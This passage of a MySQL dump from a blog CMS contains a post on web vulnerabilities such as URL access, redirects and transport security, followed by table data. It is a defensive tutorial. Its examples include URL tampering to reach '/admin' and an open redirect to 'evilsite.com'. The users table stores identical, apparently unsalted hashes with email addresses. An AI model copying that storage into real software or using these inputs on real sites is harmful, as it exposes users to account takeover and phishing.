database.</li>\n</ul>\n\n<p><strong>Examples</strong></p>\n\n<p>In one of the banking application, password database uses unsalted hashes * to store everyone&rsquo;s passwords. An SQL injection flaw allows the attacker to retrieve the password file. All the unsalted hashes can be brute forced in no time whereas, the salted passwords would take thousands of years.</p>\n\n<p>(*Unsalted Hashes &ndash; Salt is a random data appended to the original data. Salt is appended to the password before hashing)</p>\n\n<p><strong>Recommendations</strong></p>\n\n<ol>\n	<li>Ensure appropriate strong standard algorithms. Do not create own cryptographic algorithms. Use only approved public algorithms such as AES, RSA public key cryptography, and SHA-256, etc.</li>\n	<li>Ensure offsite backups are encrypted, but the keys are managed and backed up separately.</li>\n</ol>\n\n<h2>Failure to restrict URL Access</h2>\n\n<p><strong>Description</strong></p>\n\n<p>Web applications check URL access rights before rendering protected links and buttons. Applications need to perform similar access control checks each time these pages are accessed.</p>\n\n<p>In most of the applications, the privileged pages, locations and resources are not presented to the privileged users.</p>\n\n<p>By an intelligent guess, an attacker can access privilege pages. An attacker can access sensitive pages, invoke functions and view confidential information.</p>\n\n<p><strong>Implication</strong></p>\n\n<ul>\n	<li>Making use of this vulnerability attacker can gain access to the unauthorized URLs, without logging into the application and exploit the vulnerability. An attacker can access sensitive pages, invoke functions and view confidential information.</li>\n</ul>\n\n<p><strong>Vulnerable objects:</strong></p>\n\n<ul>\n	<li>URLs</li>\n</ul>\n\n<p><strong>Examples</strong></p>\n\n<ol>\n	<li>Attacker notices the URL indicates the role as &ldquo;/user/getaccounts.&rdquo; He modifies as &ldquo;/admin/getaccounts&rdquo;.</li>\n	<li>An attacker can append role to the URL.</li>\n</ol>\n\n<p><strong>http://www.vulnerablsite.com</strong>&nbsp;can be modified as&nbsp;<strong>http://www.vulnerablesite.com/admin</strong></p>\n\n<p><strong>Recommendations</strong></p>\n\n<ol>\n	<li>Implement strong access control checks.</li>\n	<li>Authentication and authorization policies should be role-based.</li>\n	<li>Restrict access to unwanted URLs.</li>\n</ol>\n\n<h2>Insufficient Transport Layer Protection</h2>\n\n<p><strong>Description</strong></p>\n\n<p>Deals with information exchange between the user (client) and the server (application). Applications frequently transmit sensitive information like authentication details, credit card information, and session tokens over a network.</p>\n\n<p>By using weak algorithms or using expired or invalid certificates or not using SSL can allow the communication to be exposed to untrusted users, which may compromise a web application and or steal sensitive information.</p>\n\n<p><strong>Implication</strong></p>\n\n<ul>\n	<li>Making use of this web security vulnerability, an attacker can sniff legitimate user&rsquo;s credentials and gaining access to the application.</li>\n	<li>Can steal credit card information.</li>\n</ul>\n\n<p><strong>Vulnerable objects</strong></p>\n\n<ul>\n	<li>Data sent over the network.</li>\n</ul>\n\n<p><strong>Recommendations</strong></p>\n\n<ol>\n	<li>Enable secure HTTP and enforce credential transfer over HTTPS only.</li>\n	<li>Ensure your certificate is valid and not expired.</li>\n</ol>\n\n<p><strong>Examples:</strong></p>\n\n<p>1. An application not using SSL, an attacker will simply monitor network traffic and observes an authenticated victim session cookie. An attacker can steal that cookie and perform Man-in-the-Middle attack.</p>\n\n<h2>Unvalidated Redirects and Forwards</h2>\n\n<p><strong>Description</strong></p>\n\n<p>The web application uses few methods to redirect and forward users to other pages for an intended purpose.</p>\n\n<p>If there is no proper validation while redirecting to other pages, attackers can make use of this and can redirect victims to phishing or malware sites, or use forwards to access unauthorized pages.</p>\n\n<p><strong>Implication</strong></p>\n\n<ul>\n	<li>An attacker can send a URL to the user that contains a genuine URL appended with encoded malicious URL. A user by just seeing the genuine part of the attacker sent URL can browse it and may become a victim.</li>\n</ul>\n\n<p><strong>Examples</strong></p>\n\n<p>1.<strong>http://www.vulnerablesite.com/login.aspx?redirectURL=ownsite.com</strong></p>\n\n<p>Modified to</p>\n\n<p><strong>http://www.vulnerablesite.com/login.aspx?redirectURL=evilsite.com</strong></p>\n\n<p><strong>Recommendations</strong></p>\n\n<ol>\n	<li>Simply avoid using redirects and forwards in the application. If used, do not involve using user parameters in calculating the destination.</li>\n	<li>If the destination parameters can&rsquo;t be avoided, ensure that the supplied value is valid, and authorized for the user.</li>\n</ol>', '1633175462.jpg', 5, 'Published');

-- --------------------------------------------------------

--
-- Table structure for table `replies`
--

CREATE TABLE `replies` (
  `id` int(11) NOT NULL,
  `commentid` int(11) NOT NULL,
  `username` varchar(255) NOT NULL,
  `useremail` varchar(255) NOT NULL,
  `body` text NOT NULL,
  `created_at` datetime NOT NULL DEFAULT current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Dumping data for table `replies`
--

INSERT INTO `replies` (`id`, `commentid`, `username`, `useremail`, `body`, `created_at`) VALUES
(1, 2, 'Shabir', 'shabir@gmail.com', 'Yes you are right.', '2021-10-02 17:05:52'),
(2, 2, 'Naveed', 'naveed@gmail.com', 'I agree with you my bro.', '2021-10-02 17:07:31');

-- --------------------------------------------------------

--
-- Table structure for table `slider`
--

CREATE TABLE `slider` (
  `id` int(11) NOT NULL,
  `postid` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Dumping data for table `slider`
--

INSERT INTO `slider` (`id`, `postid`) VALUES
(1, 13),
(2, 11),
(3, 6);

-- --------------------------------------------------------

--
-- Table structure for table `social_links`
--

CREATE TABLE `social_links` (
  `id` int(11) NOT NULL,
  `userid` int(11) NOT NULL,
  `fb` varchar(255) NOT NULL,
  `twitter` varchar(255) NOT NULL,
  `gplus` varchar(255) NOT NULL,
  `linkedin` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Dumping data for table `social_links`
--

INSERT INTO `social_links` (`id`, `userid`, `fb`, `twitter`, `gplus`, `linkedin`) VALUES
(1, 1, 'https://www.facebook.com/razzaqzone', 'https://www.facebook.com/razzaqzone', 'https://www.facebook.com/razzaqzone', 'https://www.facebook.com/razzaqzone'),
(6, 2, '', '', '', ''),
(7, 3, '', '', '', '');

-- --------------------------------------------------------

--
-- Table structure for table `users`
--

CREATE TABLE `users` (
  `id` int(11) NOT NULL,
  `fullname` varchar(255) NOT NULL,
  `username` varchar(255) NOT NULL,
  `password` varchar(255) NOT NULL,
  `email` varchar(255) NOT NULL,
  `about` varchar(255) NOT NULL DEFAULT ' ',
  `image` varchar(255) NOT NULL,
  `role` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Dumping data for table `users`
--

INSERT INTO `users` (`id`, `fullname`, `username`, `password`, `email`, `about`, `image`, `role`) VALUES
(1, 'Admin', 'admin', '15528f65935e4fe65b7a5bdbbb019c97', 'ab.razzaq32@yahoo.com', 'This is about me.', '1632919278blog_03.jpg', 'Admin'),
(2, 'Akram', 'akram123', '15528f65935e4fe65b7a5bdbbb019c97', 'akram@gmail.com', ' ', '', 'Moderator'),
(3, 'Habib', 'habib123', '15528f65935e4fe65b7a5bdbbb019c97', 'habib@gmail.com', ' ', '', 'Author');

--
-- Indexes for dumped tables
--

--
-- Indexes for table `categories`
--
ALTER TABLE `categories`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `cat_links`
--
ALTER TABLE `cat_links`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `comments`
--
ALTER TABLE `comments`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `contact_queries`
--
ALTER TABLE `contact_queries`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `limits`
--
ALTER TABLE `limits`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `pages`
--
ALTER TABLE `pages`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `posts`
--
ALTER TABLE `posts`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `replies`
--
ALTER TABLE `replies`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `slider`
--
ALTER TABLE `slider`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `social_links`
--
ALTER TABLE `social_links`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `users`
--
ALTER TABLE `users`
  ADD PRIMARY KEY (`id`);

--
-- AUTO_INCREMENT for dumped tables
--

--
-- AUTO_INCREMENT for table `categories`
--
ALTER TABLE `categories`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=9;

--
-- AUTO_INCREMENT for table `cat_links`
--
ALTER TABLE `cat_links`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=77;

--
-- AUTO_INCREMENT for table `comments`
--
ALTER TABLE `comments`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=6;

--
-- AUTO_INCREMENT for table `contact_queries`
--
ALTER TABLE `contact_queries`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=3;

--
-- AUTO_INCREMENT for table `limits`
--
ALTER TABLE `limits`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- AUTO_INCREMENT for table `pages`
--
ALTER TABLE `pages`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=9;

--
-- AUTO_INCREMENT for table `posts`
--
ALTER TABLE `posts`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=31;

--
-- AUTO_INCREMENT for table `replies`
--
ALTER TABLE `replies`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=3;

--
-- AUTO_INCREMENT for table `slider`
--
ALTER TABLE `slider`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=5;

--
-- AUTO_INCREMENT for table `social_links`
--
ALTER TABLE `social_links`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=8;

--
-- AUTO_INCREMENT for table `users`
--
ALTER TABLE `users`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=4;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
